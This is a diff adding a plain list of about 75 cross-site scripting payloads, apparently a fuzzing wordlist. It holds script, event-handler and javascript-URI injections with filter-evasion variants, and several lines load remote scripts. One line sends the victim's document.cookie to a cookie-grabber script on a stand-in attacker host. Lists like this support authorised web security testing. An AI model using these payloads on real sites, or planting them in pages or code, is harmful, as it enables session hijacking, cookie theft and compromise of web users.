@@ -1,0 +1,75 @@
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+"><script>alert(0)</script>
+<script src=http://yoursite.com/your_files.js></script>
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<font style='color:expression(alert(document.cookie))'>
+<img src="javascript:alert('XSS')">
+<script language="JavaScript">alert('XSS')</script>
+[url=javascript:alert('XSS');]click me[/url]
+<body onunload="javascript:alert('XSS');">
+<script>alert(1);</script>
+<script>alert('XSS');</script>
+<script src="http://www.evilsite.org/cookiegrabber.php"></script>
+<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="+escape(document.cookie)</script>
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=foo.png onerror=alert(/xssed/) />   
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>   
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>   
+<marquee><script>alert('XSS')</script></marquee>   
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">   
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">   
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\
+<body onLoad="alert('XSS');"   
+[color=red' onmouseover="alert('xss')"]mouse over[/color] 
+"/></a></><img src=1.gif onerror=alert(1)>    
+window.alert("Bonjour !");   
+<div style="x:expression((window.r==1)?'':eval('r=1;   
+alert(String.fromCharCode(88,83,83));'))">   
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>   
+"><script alert(String.fromCharCode(88,83,83))</script>   
+'>><marquee><h1>XSS</h1></marquee>   
+'">><script>alert('XSS')</script>   
+'">><marquee><h1>XSS</h1></marquee>   
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">   
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">   
+<script>var var = 1; alert(var)</script>   
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>   
+<?='<SCRIPT>alert("XSS")</SCRIPT>'?>   
+<IMG SRC='vbscript:msgbox(\"XSS\")'>   
+" onfocus=alert(document.domain) "> <"   
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>   
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS   
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out   
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out   
+<br size=\"&{alert('XSS')}\">   
+<scrscriptipt>alert(1)</scrscriptipt>   
+</br style=a:expression(alert())>   
+</script><script>alert(1)</script> 
+<SCRIPT>document.write("XSS");</SCRIPT>   
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);   
+='><script>alert("xss")</script>
+<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>   
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>   
+">/XaDoS/><script>alert(document.cookie)</script>
+<script>  src="http://www.site.com/XSS.js"></script>   
+">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>   
+src="http://www.site.com/XSS.js"></script>         
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>   
+[color=red width=expression(alert(123))][color]   
+<BASE HREF="javascript:alert('XSS');//">   
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<   
+"></iframe><script>alert(123)</script>   
+<body onLoad="while(true) alert('XSS');">   
+'"></title><script>alert(1111)</script>   
+</textarea>'"><script>alert(document.cookie)</script>   
+'""><script language="JavaScript"> alert('X \nS \nS');</script>   
+</script></script><<<<script><>>>><<<script>alert(123)</script>      
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">   
+'></select><script>alert(123)</script>   
+'>"><script src = 'http://www.site.com/XSS.js'></script>   
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
